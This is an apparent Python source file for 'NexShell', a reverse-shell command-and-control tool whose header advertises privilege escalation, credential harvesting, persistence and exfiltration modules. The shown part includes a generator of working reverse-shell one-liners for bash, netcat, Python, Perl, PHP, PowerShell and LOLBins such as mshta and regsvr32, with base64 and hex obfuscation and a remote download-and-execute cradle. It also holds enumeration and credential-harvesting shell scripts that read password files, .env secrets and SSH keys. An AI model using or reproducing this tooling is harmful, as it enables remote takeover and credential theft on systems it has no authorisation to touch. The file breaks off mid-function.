#!/usr/bin/env python3

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  NexShell — Elite Reverse Shell Commander                                  ║
# ║  Nexus of Shell Operations                                                  ║
# ║                                                                              ║
# ║  Author  : vulnquest58                                                       ║
# ║  Version : 1.0.0                                                            ║
# ║  License : MIT                                                               ║
# ║                                                                              ║
# ║  Cross-Platform: Linux · Windows · macOS · BSD                              ║
# ║  Modules: QuickEnum · PrivEsc · CredHarvest · AD Recon                     ║
# ║           Persistence · Lateral Movement · Container Escape · Exfil        ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

__program__   = "nexshell"
__version__   = "1.0.0"
__author__    = "vulnquest58"
__banner__    = r'''
             .o oOOOOOOOo                                            OOOo
             Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
             OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
             OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
             `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
             .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
             OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
            oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
           oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
          OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
          "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
             Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
             :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?          
                          oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                          '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                               `$"  `OOOO' `O"Y ' `OOOO'  o              
                                      OP"          : o                                 
              Nexus of Shell Operations  ·  Elite Reverse Shell Commander
'''

import os, io, re, sys, ssl, time, gzip, json, shlex, queue, struct
import shutil, socket, signal, base64, secrets, tarfile, logging
import zipfile, inspect, tempfile, platform, itertools, traceback, threading
import subprocess, socketserver

# ── Ensure nexshell's own directory is on sys.path ──────────────────────────
_NEXSHELL_DIR = os.path.dirname(os.path.abspath(__file__))
if _NEXSHELL_DIR not in sys.path:
    sys.path.insert(0, _NEXSHELL_DIR)

# ── NexShell v2 modules (lazy — won't crash if partially built) ───────────────
def _try_import(module, attr=None):
    """Silent import helper — returns None on failure."""
    try:
        import importlib
        mod = importlib.import_module(module)
        return getattr(mod, attr) if attr else mod
    except Exception:
        return None

# ── Platform detection ────────────────────────────────────────────────────────
IS_WINDOWS = os.name == 'nt'
IS_UNIX    = not IS_WINDOWS

# ── Unix-only modules (conditional) ──────────────────────────────────────────
if IS_UNIX:
    import tty
    import termios
    import fcntl
    import pty as _pty_mod
else:
    tty      = None
    termios  = None
    fcntl    = None
    _pty_mod = None

# ── Readline (optional — not available everywhere on Windows) ─────────────────
try:
    import readline as _readline
    HAS_READLINE = True
except ImportError:
    _readline    = None
    HAS_READLINE = False

# ── Windows terminal: enable ANSI escape codes ────────────────────────────────
if IS_WINDOWS:
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        # Enable ENABLE_VIRTUAL_TERMINAL_PROCESSING (0x0004) on stdout
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-12), 7)
    except Exception:
        pass
    # Force UTF-8 on Windows stdout/stderr — prevents UnicodeEncodeError
    import io as _io
    if hasattr(sys.stdout, 'buffer'):
        sys.stdout = _io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
    if hasattr(sys.stderr, 'buffer'):
        sys.stderr = _io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)
    # Windows does not have select() on stdin — provide a shim
    from threading import Event as _WinEvent

from math      import ceil
from glob      import glob
from json      import dumps
from code      import interact
from zlib      import compress
from errno     import EADDRINUSE, EADDRNOTAVAIL
from select    import select
from pathlib   import Path, PureWindowsPath
from argparse  import ArgumentParser, RawTextHelpFormatter
from datetime  import datetime, timedelta
from textwrap  import indent, dedent
from binascii  import Error as binascii_error
from functools import wraps
from contextlib import ExitStack
from collections import deque, defaultdict
from http.server import SimpleHTTPRequestHandler
from urllib.parse import unquote, quote
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen
from concurrent.futures import ThreadPoolExecutor, as_completed
from string import ascii_letters
from random import choice, randint
from threading import Thread, RLock, current_thread

# ── UI Engine (lazy import — fails gracefully if missing) ───────────────
_ui = None
def _load_ui():
    global _ui
    if _ui is None:
        try:
            from modules import ui as _ui_mod
            _ui = _ui_mod
        except Exception:
            _ui = None
    return _ui


# ── Professional REPL (optional — prompt_toolkit + Rich) ─────────────────
try:
    from prompt_toolkit                 import PromptSession as _PTSession
    from prompt_toolkit.history         import FileHistory   as _PTHistory
    from prompt_toolkit.auto_suggest    import AutoSuggestFromHistory as _PTSuggest
    from prompt_toolkit.completion      import Completer as _PTCompleter, Completion as _PTCompletion
    from prompt_toolkit.styles          import Style as _PTStyle
    from prompt_toolkit.formatted_text  import HTML as _PTHTML, ANSI as _PTANSI
    HAS_PROMPT_TOOLKIT = True
except ImportError:
    HAS_PROMPT_TOOLKIT = False

try:
    from rich.console   import Console  as _RichConsole
    from rich.panel     import Panel    as _RichPanel
    from rich.text      import Text     as _RichText
    from rich           import box      as _rich_box
    from rich.table     import Table    as _RichTable
    HAS_RICH = True
    _rcon = _RichConsole(highlight=False)
except ImportError:
    HAS_RICH = False
    _rcon = None


# ── System / LHOST detection ─────────────────────────────────────────────
def _get_lhost() -> str:
    """Return the best non-loopback IPv4 address of this machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "127.0.0.1"

def _detect_shell() -> str:
    """Detect the shell/terminal the operator is using."""
    # Windows PowerShell / cmd
    if IS_WINDOWS:
        ps = os.environ.get('PSVersionTable', '')
        if os.environ.get('PSModulePath'):
            ver = subprocess.run(
                ["powershell", "-NoProfile", "-Command", "$PSVersionTable.PSVersion.Major"],
                capture_output=True, text=True, timeout=3
            )
            ver = ver.stdout.strip() if not ver.returncode else '?'
            return f"PowerShell {ver}"
        if os.environ.get('ComSpec', '').lower().endswith('cmd.exe'):
            return "cmd.exe"
        return "Windows Terminal" if os.environ.get('WT_SESSION') else "unknown"
    # Unix
    shell = os.environ.get('SHELL', '')
    if 'zsh'  in shell: return 'zsh'
    if 'bash' in shell: return 'bash'
    if 'fish' in shell: return 'fish'
    if shell:           return os.path.basename(shell)
    return 'unknown'

def _detect_terminal() -> str:
    """Best-effort terminal name detection."""
    checks = [
        ('WT_SESSION',    'Windows Terminal'),
        ('TERM_PROGRAM',  None),           # value is the name
        ('TERM',          None),
        ('COLORTERM',     None),
    ]
    for env, label in checks:
        v = os.environ.get(env)
        if v:
            return label or v
    if IS_WINDOWS:
        return 'conhost'
    return 'unknown'

def _get_all_local_ips() -> list:
    """Return all non-loopback IPv4 addresses sorted by interface priority."""
    ips_with_info = []
    try:
        import subprocess as _sp
        if IS_WINDOWS:
            out = _sp.run(['ipconfig'], capture_output=True, text=True, timeout=5).stdout
            current_adapter = "Unknown"
            for line in out.splitlines():
                cleaned = line.strip()
                if not line.startswith(' ') and cleaned and not line.startswith('.'):
                    if ':' in line:
                        current_adapter = line.split(':')[0].strip()
                elif 'IPv4' in cleaned and ':' in cleaned:
                    ip = cleaned.split(':')[-1].strip()
                    if ip and not ip.startswith('127.'):
                        ips_with_info.append((ip, current_adapter))
        else:
            out = _sp.run(['ip', '-4', 'addr', 'show'], capture_output=True, text=True, timeout=5).stdout
            current_iface = "unknown"
            for line in out.splitlines():
                cleaned = line.strip()
                if cleaned.startswith(tuple(str(i)+':' for i in range(100))):
                    parts = cleaned.split(':')
                    if len(parts) > 1:
                        current_iface = parts[1].strip()
                elif cleaned.startswith('inet '):
                    parts = cleaned.split()
                    if len(parts) > 1:
                        ip = parts[1].split('/')[0]
                        iface = parts[-1] if len(parts) > 2 and parts[-2] != 'brd' else current_iface
                        if ip and not ip.startswith('127.'):
                            ips_with_info.append((ip, iface))
    except Exception:
        pass

    if not ips_with_info:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith('127.'):
                ips_with_info.append((ip, "default"))
        except Exception:
            pass

    def get_priority(item):
        ip, name = item
        name_lower = name.lower()
        # VPNs (Highest Priority)
        if any(x in name_lower for x in ['vpn', 'tun', 'tap', 'ppp', 'wireguard', 'openvpn', 'forti', 'cisco']):
            return 1
        # Virtualization / WSL / Hyper-V / VirtualBox / VMware (Lowest Priority)
        if any(x in name_lower for x in ['virtual', 'vbox', 'vmnet', 'vethernet', 'wsl', 'host-only', 'docker', 'switch', 'loopback']):
            return 3
        # WiFi / Ethernet / Physical
        if any(x in name_lower for x in ['wireless', 'wi-fi', 'wifi', 'wlan', 'ethernet', 'enp', 'eth']):
            return 2
        return 2.5

    ips_with_info.sort(key=get_priority)
    
    sorted_ips = []
    for ip, _ in ips_with_info:
        if ip not in sorted_ips:
            sorted_ips.append(ip)
            
    return sorted_ips




rand              = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
caller            = lambda: inspect.stack()[2].function
chunks            = lambda s, n: (s[0+i:n+i] for i in range(0, len(s), n))
normalize_path    = lambda p: os.path.normpath(os.path.expandvars(os.path.expanduser(p)))
pathlink          = lambda path: (
    f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07'
    f'\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
)

# ══════════════════════════════════════════════════════════════════════════════
#  COLOUR ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class paint:
    _codes  = {'RESET':0,'BRIGHT':1,'DIM':2,'UNDERLINE':4,'BLINK':5,'NORMAL':22}
    _colors = {
        'black':0,'red':1,'green':2,'yellow':3,'blue':4,'magenta':5,
        'cyan':6,'orange':208,'white':15,'lightgrey':250,'darkgrey':242,
        'purple':129,'pink':205,'lime':118,'teal':51,
    }
    _escape = lambda codes: f"\001\x1b[{codes}m\002"

    def __init__(self, text=None, colors=None):
        self.text   = str(text) if text is not None else None
        self.colors = colors or []

    def __str__(self):
        if self.colors:
            content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
            return __class__._escape(';'.join(self.colors)) + content
        return self.text

    def __len__(self):   return len(self.text)
    def __add__(self, t): return str(self) + str(t)
    def __mul__(self, n): return __class__(self.text * n, self.colors)

    def __getattr__(self, attr):
        self.colors.clear()
        for color in attr.split('_'):
            if color in __class__._codes:
                self.colors.append(str(__class__._codes[color]))
            else:
                prefix = "3" if color in __class__._colors else "4"
                self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
        return self


# ══════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════════════════════
logging.TRACE = 15
logging.addLevelName(logging.TRACE, 'TRACE')

class CustomFormatter(logging.Formatter):
    templates = {
        logging.CRITICAL: {'color': 'RED',     'prefix': '[!!!]'},
        logging.ERROR:    {'color': 'red',     'prefix': '[-]  '},
        logging.WARNING:  {'color': 'yellow',  'prefix': '[!]  '},
        logging.TRACE:    {'color': 'teal',    'prefix': '[•]  '},
        logging.INFO:     {'color': 'lime',    'prefix': '[+]  '},
        logging.DEBUG:    {'color': 'magenta', 'prefix': '[DBG]'},
    }

    def format(self, record):
        t = self.templates[record.levelno]
        text = f"{t['prefix']} {logging.Formatter.format(self, record)}"
        return f"\x1b[2K\r{getattr(paint(text), t['color'])}\r\n"

def _make_logger(name, level=logging.INFO):
    log = logging.getLogger(name)
    log.setLevel(level)
    h = logging.StreamHandler(sys.stderr)
    h.setFormatter(CustomFormatter())
    log.addHandler(h)
    log.propagate = False
    return log

logger    = _make_logger('nexshell')
cmdlogger = _make_logger('nexshell.cmd')


# ══════════════════════════════════════════════════════════════════════════════
#  OPTIONS  (global config object)
# ══════════════════════════════════════════════════════════════════════════════
class Options:
    def __init__(self):
        self.interface               = 'any'
        self.ports                   = [4444]
        self.default_listener_port   = 4444
        self.maintain                = 1
        self.histlength              = 1000
        self.max_open_files          = 5
        self.max_sessions            = 5
        self.network_buffer_size     = 8192
        self.upload_random_suffix    = False
        self.no_upgrade              = False
        self.no_attach               = False
        self.single_session          = False
        self.basedir                 = Path.home() / f'.{__program__}'
        self.basedir.mkdir(parents=True, exist_ok=True)
        self.debug                   = False
        self.escape                  = {'key': 'F12', 'sequence': b'\x1b[24~'}
        self.jitter                  = 0          # ms jitter between commands (stealth)
        self.stealth_mode            = False      # anti-forensics, no disk writes on target
        self.auto_enum               = False      # auto-run QuickEnum on new sessions
        self.shell_quality           = True       # show shell quality score on connect
        # ── v2.2 additions ────────────────────────────────────────────────────
        self.lhost                   = '0.0.0.0'  # auto-detected at startup
        self.lhost_all               = []         # all local IPs
        self.shell_type              = 'unknown'  # operator shell (bash/zsh/powershell/cmd)
        self.terminal_type           = 'unknown'  # operator terminal (WT/xterm/conhost)
        self.auto_tty                = True       # auto TTY-upgrade new sessions
        self.auto_share              = False      # auto-start file share server at launch
        self.share_port              = 9001       # HTTP share server port
        self._share_server           = None       # running share server ref

options = Options()


# ══════════════════════════════════════════════════════════════════════════════
#  SHELL INTELLIGENCE ENGINE
# ══════════════════════════════════════════════════════════════════════════════
SHELL_QUALITY = {
    'dumb':     (0,  paint('●').red,     'Dumb    '),
    'basic':    (1,  paint('●').yellow,  'Basic   '),
    'readline': (2,  paint('●').orange,  'Readline'),
    'pty':      (3,  paint('●').lime,    'PTY     '),
}

OS_FINGERPRINTS = {
    'linux':   ['uid=', '/bin/bash', '/bin/sh', 'Linux', 'GNU', '/etc/'],
    'windows': ['Windows', 'SYSTEM', 'cmd.exe', 'powershell', 'NT AUTHORITY',
                'C:\\Windows', 'Microsoft', 'PS C:', 'USERPROFILE', 'SystemRoot'],
    'macos':   ['Darwin', 'macOS', 'brew', '/Users/', 'dylib'],
    'bsd':     ['FreeBSD', 'OpenBSD', 'NetBSD', 'DragonFly'],
}

def detect_os(banner: str) -> str:
    b = banner.lower()
    if any(w.lower() in b for w in OS_FINGERPRINTS['windows']): return 'Windows'
    if any(w.lower() in b for w in OS_FINGERPRINTS['macos']):   return 'macOS'
    if any(w.lower() in b for w in OS_FINGERPRINTS['bsd']):     return 'BSD'
    return 'Linux'

def is_windows_session(session) -> bool:
    return getattr(session, 'OS', 'Linux') == 'Windows'

def detect_privilege(whoami_output: str) -> tuple:
    """Returns (is_root: bool, label: str, color_indicator: str)."""
    w = whoami_output.strip().lower()
    if any(x in w for x in ('root', 'system', 'nt authority\\system', 'administrator', 'uid=0')):
        return True, 'ROOT', str(paint('◆ ROOT').red_BRIGHT)
    return False, whoami_output.strip(), str(paint('◇ USER').yellow)

def shell_quality_score(shell_type: str) -> str:
    q = SHELL_QUALITY.get(shell_type.lower(), SHELL_QUALITY['dumb'])
    return f"{q[1]} {q[2]} (score: {q[0]}/3)"


# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD GENERATOR  (enhanced with obfuscation)
# ══════════════════════════════════════════════════════════════════════════════
class PayloadGenerator:
    """Cross-platform reverse shell payload generator with obfuscation."""
    SHELLS = ['bash', 'sh', 'zsh', 'python3', 'python', 'ruby', 'perl', 'php',
              'powershell', 'nc', 'ncat', 'busybox', 'curl', 'wget', 'node',
              'mshta', 'wmic', 'certutil', 'regsvr32', 'rundll32']

    @staticmethod
    def bash(host, port):
        return f'bash -i >& /dev/tcp/{host}/{port} 0>&1'

    @staticmethod
    def bash_196(host, port):
        return f'exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196'

    @staticmethod
    def sh(host, port):
        return f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port} >/tmp/f'

    @staticmethod
    def python3(host, port):
        return (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                f"s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);"
                f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'")

    @staticmethod
    def perl(host, port):
        return (f"perl -e 'use Socket;$i=\"{host}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'")

    @staticmethod
    def ruby(host, port):
        return (f"ruby -rsocket -e 'f=TCPSocket.open(\"{host}\",{port});"
                f"[0,1,2].each{{|fd| syscall(33,f.fileno,fd)}};exec(\"/bin/sh -i\")'")

    @staticmethod
    def php(host, port):
        return (f'php -r \'$sock=fsockopen("{host}",{port});'
                f'exec("/bin/sh -i <&3 >&3 2>&3");\'')

    @staticmethod
    def nc(host, port):
        return f'nc -e /bin/sh {host} {port}'

    @staticmethod
    def ncat(host, port):
        return f'ncat {host} {port} -e /bin/bash'

    @staticmethod
    def busybox(host, port):
        return f'busybox nc {host} {port} -e /bin/sh'

    @staticmethod
    def powershell(host, port):
        cmd = (f'$client=New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});'
               f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
               f'while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{'
               f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
               f'$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";'
               f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
               f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()')
        return f'powershell -nop -NonI -ep bypass -c "{cmd}"'

    @staticmethod
    def mshta(host, port):
        cmd = (f'$c=New-Object Net.Sockets.TCPClient("{host}",{port});'
               f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
               f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
               f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
               f'$r=(iex $d 2>&1|Out-String);'
               f'$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
               f'$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()')
        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc {enc}"",0:close")'

    @staticmethod
    def wmic(host, port):
        cmd = (f'$c=New-Object Net.Sockets.TCPClient("{host}",{port});'
               f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
               f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
               f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
               f'$r=(iex $d 2>&1|Out-String);'
               f'$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
               f'$s.Write($sb,0,$sb.Length)}};$c.Close()')
        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f'wmic process call create "powershell -nop -ep bypass -enc {enc}"'

    @staticmethod
    def conptyshell(host, port):
        setup  = ('IEX(New-Object Net.WebClient).DownloadString('
                  "'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1');")
        invoke = f'Invoke-ConPtyShell -RemoteIp {host} -RemotePort {port} -Rows 50 -Cols 220'
        enc    = base64.b64encode((setup + invoke).encode('utf-16-le')).decode()
        return f'powershell -nop -NonI -ep bypass -enc {enc}'

    @staticmethod
    def regsvr32(host, port):
        return f'regsvr32 /s /n /u /i:http://{host}:{port}/payload.sct scrobj.dll'

    @classmethod
    def obfuscate_b64(cls, payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        return f'echo {encoded}|base64 -d|sh'

    @classmethod
    def obfuscate_hex(cls, payload: str) -> str:
        hex_str = payload.encode().hex()
        return f'echo {hex_str}|xxd -r -p|sh'

    @classmethod
    def all_payloads(cls, host: str, port: int, obfuscate: bool = False,
                     target_os: str = 'all') -> list:
        linux_generators = [
            ('bash',               cls.bash),
            ('bash-196',           cls.bash_196),
            ('sh (mkfifo)',        cls.sh),
            ('python3',            cls.python3),
            ('perl',               cls.perl),
            ('ruby',               cls.ruby),
            ('php',                cls.php),
            ('nc',                 cls.nc),
            ('ncat',               cls.ncat),
            ('busybox',            cls.busybox),
        ]
        windows_generators = [
            ('powershell',         cls.powershell),
            ('mshta (LOLBin)',     cls.mshta),
            ('wmic (LOLBin)',      cls.wmic),
            ('conptyshell (PTY)',  cls.conptyshell),
            ('regsvr32 (LOLBin)', cls.regsvr32),
        ]

        if target_os == 'windows':
            generators = windows_generators
        elif target_os == 'linux':
            generators = linux_generators
        else:
            generators = linux_generators + windows_generators
        results = []
        for name, fn in generators:
            try:
                payload = fn(host, port)
                entry = {'name': name, 'payload': payload}
                if obfuscate:
                    entry['b64']  = cls.obfuscate_b64(payload)
                    entry['hex']  = cls.obfuscate_hex(payload)
                results.append(entry)
            except Exception:
                pass
        return results

    @classmethod
    def display(cls, host: str, port: int, obfuscate: bool = False,
                target_os: str = 'all'):
        payloads = cls.all_payloads(host, port, obfuscate, target_os)
        os_icons = {'linux': 'Linux', 'windows': 'Windows', 'all': 'All Platforms'}
        os_label_str = os_icons.get(target_os, 'All')
        os_label = {
            'linux':   paint(f'[Linux]').lime,
            'windows': paint(f'[Windows]').cyan,
            'all':     paint(f'[All Platforms]').purple,
        }.get(target_os, paint('[All]').purple)
        print(f'\n  {paint("NexShell Payload Arsenal").purple_BRIGHT}  '
              f'{paint(f"-> {host}:{port}").teal}  {os_label}\n')
        linux_done = False
        for i, p in enumerate(payloads, 1):
            name = p["name"]
            # Section headers
            if target_os == 'all':
                if not linux_done and any(x in name for x in ['powershell','mshta','wmic','conpty','regsvr']):
                    linux_done = True
                    print(f'  {paint("-- Windows --------------------------------------------------").darkgrey}')
                elif i == 1:
                    print(f'  {paint("-- Linux ----------------------------------------------------").darkgrey}')
            # Build colored name — pad using str operations
            if 'LOLBin' in name or 'PTY' in name:
                col_str = str(paint(name).orange)
            else:
                col_str = str(paint(name).cyan)
            # Pad to fixed width (accounting for ANSI escape codes — use raw name for width)
            pad = max(0, 28 - len(name))
            print(f'  {paint(f"[{i:02d}]").purple} {col_str}{" " * pad} {paint(p["payload"]).white}')
            if obfuscate:
                print(f'       {paint("base64:").darkgrey} {p.get("b64","")}')
                print(f'       {paint("hex:   ").darkgrey} {p.get("hex","")}')
            print()


# ══════════════════════════════════════════════════════════════════════════════
#  RECON MODULES
# ══════════════════════════════════════════════════════════════════════════════
QUICKENUM_SCRIPT = r"""
echo "=== [NexShell QuickEnum] ==="
echo "--- OS Info ---"
uname -a 2>/dev/null; cat /etc/os-release 2>/dev/null | head -5
echo "--- Current User ---"
id; whoami; groups
echo "--- Sudo Rights ---"
sudo -l 2>/dev/null || echo "[no sudo]"
echo "--- SUID Binaries ---"
find / -perm -4000 -type f 2>/dev/null | head -20
echo "--- Writable /etc Files ---"
find /etc -writable -type f 2>/dev/null | head -10
echo "--- Cron Jobs ---"
cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null
echo "--- Network Interfaces ---"
ip a 2>/dev/null || ifconfig 2>/dev/null
echo "--- Open Ports (internal) ---"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -20
echo "--- Interesting Files ---"
find / -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -v proc | head -20
echo "--- History Files ---"
cat ~/.bash_history 2>/dev/null | tail -30
echo "--- SSH Keys ---"
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -5
echo "=== [QuickEnum Done] ==="
"""

CRED_HARVESTER_SCRIPT = r"""
echo "=== [NexShell CredHarvest] ==="
echo "--- /etc/passwd ---"
cat /etc/passwd | grep -v nologin | grep -v false
echo "--- .env files ---"
find / -name ".env" 2>/dev/null | head -10 | xargs grep -l "PASS\|SECRET\|KEY" 2>/dev/null
echo "--- Config files with credentials ---"
grep -rn "password\s*=\|passwd\s*=\|secret\s*=" /etc/ /var/www/ /opt/ 2>/dev/null | grep -v "^Binary" | head -30
echo "--- Database configs ---"
find / -name "*.php" -o -name "config.yml" -o -name "database.yml" 2>/dev/null | xargs grep -l "password\|passwd" 2>/dev/null | head -10
echo "--- SSH authorized_keys ---"
find / -name "authorized_keys" 2>/dev/null | xargs cat 2>/dev/null
echo "=== [CredHarvest Done] ==="
"""

PRIVESC_SCRIPT = r"""
echo "=== [NexShell PrivEsc Advisor] ==="
echo "--- Kernel Version ---"
uname -r
echo "--- Writable PATH dirs ---"
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable 2>/dev/null
echo "--- SUID with GTFOBins potential ---"
SUID=$(find / -perm -4000 -type f 2>/dev/null)
echo "$SUID"
for b in nmap vim find bash cp python python3 perl ruby wget curl nc netcat awk gdb git strace; do
  echo "$SUID" | grep -q "/$b" && echo "[!] SUID $b found — check GTFOBins!"
done
echo "--- Capabilities ---"
getcap -r / 2>/dev/null | head -20
echo "--- NFS Exports ---"
cat /etc/exports 2>/dev/null
echo "--- Writable service files ---"
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null | head -10
echo "--- Docker socket ---"
ls -la /var/run/docker.sock 2>/dev/null
echo "--- LXD membership ---"
id | grep -q lxd && echo "[!] User in lxd group - container escape possible"
echo "=== [PrivEsc Advisor Done] ==="
"""


# ══════════════════════════════════════════════════════════════════════════════
#  TABLE  (rendering helper)
# ══════════════════════════════════════════════════════════════════════════════
class Table:
    def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
        self.list_of_lists = list_of_lists
        self.joinchar = joinchar
        self.fillchar  = [fillchar] if isinstance(fillchar, str) else fillchar
        self.data, self.max_row_len, self.col_max_lens = [], 0, []
        if header: self.header = header
        for row in self.list_of_lists: self += row

    @property
    def header(self): ...

    @header.setter
    def header(self, h): self.add_row(h, header=True)

    def __str__(self):
        self.fill()
        return "\n".join([self.joinchar.join(row) for row in self.data])

    def __len__(self): return len(self.data)

    def add_row(self, row, header=False):
        row_len = len(row)
        if row_len > self.max_row_len: self.max_row_len = row_len
        cur = len(self.col_max_lens)
        for _ in range(row_len - cur): self.col_max_lens.append(0)
        for _ in range(cur - row_len): row.append("")
        new_row = []
        for i, el in enumerate(row):
            if not isinstance(el, (str, paint)): el = str(el)
            new_row.append(el)
            if len(el) > self.col_max_lens[i]: self.col_max_lens[i] = len(el)
        if header: self.data.insert(0, new_row)
        else: self.data.append(new_row)

    def __iadd__(self, row):
        self.add_row(row)
        return self

    def fill(self):
        for row in self.data:
            for i, el in enumerate(row):
                fc = self.fillchar[0] if i in [*self.fillchar][1:] else ' '
                row[i] = el + fc * (self.col_max_lens[i] - len(el))


# ══════════════════════════════════════════════════════════════════════════════
#  SIZE  helper
# ══════════════════════════════════════════════════════════════════════════════
class Size:
    units = ("", "K", "M", "G", "T", "P")
    def __init__(self, b): self.bytes = b
    def __str__(self):
        i, s = 0, self.bytes
        while s >= 1024 and i < len(__class__.units)-1: s /= 1024; i += 1
        return f"{s:.1f} {__class__.units[i]}B"

    @classmethod
    def from_str(cls, s):
        if s.isnumeric(): return cls(int(s))
        try:
            n, u = int(s[:-1]), s[-1]
            return cls(n * 1024 ** __class__.units.index(u))
        except ValueError:
            logger.error("Invalid size"); return None


# ══════════════════════════════════════════════════════════════════════════════
#  PROGRESS BAR
# ══════════════════════════════════════════════════════════════════════════════
class PBar:
    pbars = []

    def __init__(self, end, caption="", barlen=None, queue=None, metric=None):
        self.end           = end if isinstance(end, int) else len(end)
        self.active        = self.end > 0
        self.pos           = 0
        self.percent       = 0
        self.caption       = caption
        self.bar           = '█'
        self.barlen        = barlen
        self.percent_prev  = -1
        self.queue         = queue
        self.metric        = metric or (lambda x: f"{x:,}")
        self.check_interval = 1
        if self.queue:
            self.trace_thread = Thread(target=self.trace)
            self.trace_thread.start()
            __class__.render_lock = RLock()
        if metric: Thread(target=self.watch_speed, daemon=True).start()
        __class__.pbars.append(self)
        print("\x1b[?25l", end='', flush=True)
        self.render()

    def __bool__(self): return self.active
    def __enter__(self): return self
    def __exit__(self, *a): self.terminate()

    def trace(self):
        while True:
            data = self.queue.get(); self.queue.task_done()
            if isinstance(data, int): self.update(data)
            elif data is None: break
            else: self.print(data)

    def watch_speed(self):
        self.pos_prev = 0; self.elapsed = 0
        while self:
            time.sleep(self.check_interval)
            self.elapsed += self.check_interval
            self.speed    = self.pos - self.pos_prev
            self.pos_prev = self.pos
            self.speed_avg = self.pos / self.elapsed
            if self.speed_avg: self.eta = int((self.end - self.pos) / self.speed_avg)
            if self: self.render()

    def update(self, step=1):
        if not self: return
        self.pos = min(self.pos + step, self.end)
        self.percent = int(self.pos * 100 / self.end)
        if self.pos >= self.end: self.terminate()
        if self.percent > self.percent_prev: self.render()

    def render_one(self):
        self.percent_prev = self.percent
        left  = f"{self.caption}["
        elapsed = "" if not hasattr(self,'elapsed') else f" | {timedelta(seconds=self.elapsed)}"
